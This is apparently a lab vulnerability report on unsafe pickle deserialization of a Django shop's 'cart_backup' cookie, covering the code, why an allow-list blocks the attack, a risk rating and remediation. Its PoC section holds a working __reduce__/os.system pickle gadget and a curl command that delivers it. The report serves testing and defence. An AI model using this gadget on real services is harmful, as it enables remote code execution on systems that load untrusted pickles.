# Description

**CWE-502: Deserialization of Untrusted Data**

The shop cart page trusts a client-supplied `cart_backup` cookie and passes its decoded bytes to `pickle`. Pickle is not a data format. Loading a pickle stream can call arbitrary importable callables through `__reduce__`, so any pickle that reaches an unrestricted `Unpickler.load()` is a code-execution primitive. The attacker controls the cookie, so no authentication is required.

**Vulnerable code (deployed source)**

`Shopping/views.py:4-6` imports `builtins`, `io`, and `pickle`.

`Shopping/views.py:33-36` defines the allow-list:

```python
_PICKLE_SAFE = {
    'builtins': {'dict', 'list', 'tuple', 'set', 'frozenset',
                 'str', 'int', 'float', 'bool', 'bytes', 'NoneType'},
}
```

`Shopping/views.py:39-43` defines the restricted unpickler:

```python
class _CartUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module in _PICKLE_SAFE and name in _PICKLE_SAFE[module]:
            return getattr(builtins, name)
        raise pickle.UnpicklingError(f"forbidden: {module}.{name}")
```

`Shopping/views.py:190-197` is the sink in `cart()`:

```python
def cart(request):
    """Display shopping cart with CSS items."""
    cart_backup = request.COOKIES.get('cart_backup')           # line 192 - untrusted input
    if cart_backup:
        try:
            _CartUnpickler(io.BytesIO(base64.b64decode(cart_backup))).load()   # line 195 - deserialization
        except Exception:
            pass                                                # line 196-197 - errors silently swallowed
```

**Why this is a finding**

The deployed code is not a plain `pickle.loads()` call. The `find_class` hook is the only control. It allows only a set of harmless builtin types and rejects every other global with `pickle.UnpicklingError`. The standard `os.system` gadget is therefore blocked. I confirmed this by running the same `_CartUnpickler` class in isolation: the `os.system` payload raises `UnpicklingError: forbidden: nt.system`, and a benign dict payload loads normally.

The result of `.load()` is discarded (line 195), so even an allowed object does nothing. The current code is not exploitable for RCE.

The vulnerability is latent. It is a single-layer defence in an unsafe pattern:

- Any future change that adds a module to `_PICKLE_SAFE` (for example `os`, `posix`, `subprocess`, or `builtins` names such as `eval`, `exec`, or `getattr`) collapses the control and yields RCE in the Django container.
- `pickle` is used where a data-only format (JSON) would be enough, so the allow-list is the only layer of defence.
- The `except Exception: pass` swallows the rejection, so an attack attempt produces no error in the HTTP response and no alert.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Identify the cookie consumer. Read `Shopping/views.py:192` and confirm that `cart_backup` is decoded and deserialized on every `GET /shop/cart/` request. | The sink is reachable by any client with no session or login. |
| 2 | Build a pickle whose `__reduce__` returns `(os.system, ('<command>',))`. | `pickle.dumps` produces an opcode stream that references `posix.system` or `nt.system`. |
| 3 | Base64-encode the pickle bytes and set the result as the `cart_backup` cookie on a request to `/shop/cart/`. | The server decodes the bytes and calls `_CartUnpickler.load()`. |
| 4 | `find_class('nt', 'system')` (or `posix`) is evaluated. `nt`/`posix` is not in `_PICKLE_SAFE`. | `pickle.UnpicklingError: forbidden: nt.system` is raised at `views.py:43`. |
| 5 | The exception is caught by `except Exception: pass` at `views.py:196-197`. The view continues and renders the cart normally. | HTTP 200 with a normal page. The command is **not** executed. No error is visible to the client. |
| 6 | Confirm the blocked result offline. Run the same `_CartUnpickler` class with a benign payload `{'a': [1, 2]}`. | The benign payload loads. The `os.system` payload is rejected. Confirmed locally with `python -I`. |

**Result:** The payload is blocked in the current deployment. The vulnerability becomes exploitable only if `_PICKLE_SAFE` is expanded to include a code-execution-capable module, or if a gadget is found that uses only the allowed builtins. The allow-list makes the second route impractical, because `dict`, `list`, `set`, `str`, and similar types cannot call functions or reach `os` through `__reduce__`.

# PoC

The script below builds the malicious pickle and encodes it for the cookie. It is useful for showing the attack shape and for testing the control. Against the current deployment it is rejected.

```python
# m13_poc.py - build a malicious cart_backup cookie for the M13 lab
import base64
import os
import pickle


class Exploit:
    def __reduce__(self):
        # Executed by pickle.load() if find_class() allows os.system
        return (os.system, ('id > /tmp/m13_pwned',))


payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

Send the cookie with curl. The `-v` flag shows whether the server returns the cart page or an error. Any error is swallowed server-side, so the response looks the same whether or not the payload was blocked.

```bash
PAYLOAD=$(python m13_poc.py)
curl -s -o /dev/null -w "%{http_code}\n" \
     -b "cart_backup=${PAYLOAD}" \
     http://localhost:8000/shop/cart/
```

**Expected result on the current deployment:** `200`. The cart renders. Because `views.py:196-197` swallows the `UnpicklingError`, the status and body give no evidence of the block. To check whether the control is working, verify on the server side that `/tmp/m13_pwned` was not created, or run the offline check shown in the Exploitation section.

**Expected result if `_PICKLE_SAFE` is expanded to include `posix` or `nt`:** the `os.system` call runs inside the Django container. The `/tmp/m13_pwned` file appears, and the HTTP response is still `200`.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Latent. If the control is bypassed, the attacker can read environment variables, Django settings, and database credentials from the container. No direct exposure today. |
| Integrity | Latent. Code execution in the Django container would allow changes to application data, orders, and balances. No direct exposure today. |
| Availability | Latent. Code execution allows process termination or resource exhaustion. A crafted pickle can also consume CPU or memory during `load()`. |

Overall severity: **Medium** (CVSS 3.1 5.3, `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`, per the M13 dev README). The issue is rated Medium rather than High or Critical because the current `find_class` allow-list blocks the standard gadget and the result of `load()` is discarded, so no code execution is reachable today. The rating reflects the unauthenticated, cookie-borne delivery and the single-layer defence that a future change could remove.

# Remediation

1. Remove `pickle` from the cart-backup path entirely. Replace the format with JSON:

   ```python
   cart_backup = request.COOKIES.get('cart_backup')
   if cart_backup:
       try:
           data = json.loads(base64.b64decode(cart_backup))
       except (ValueError, json.JSONDecodeError):
           data = {}
   ```

2. Validate the decoded structure against a schema (`pydantic`, `marshmallow`, or a hand-written type check) before using any field. Reject unexpected keys and types.
3. Store cart state server-side, keyed by the session ID. The client should send only the session cookie, never serialized application state.
4. Stop swallowing deserialization errors silently. Log them so that attack attempts are visible.
5. Add a `bandit` rule (B301, `pickle`) to CI, so that any new `pickle` or `Unpickler` usage is rejected at code review.
6. Add a regression test that submits a `__reduce__` payload as `cart_backup` and asserts that no command runs and no unexpected module is loaded.

# Author
WOCSA
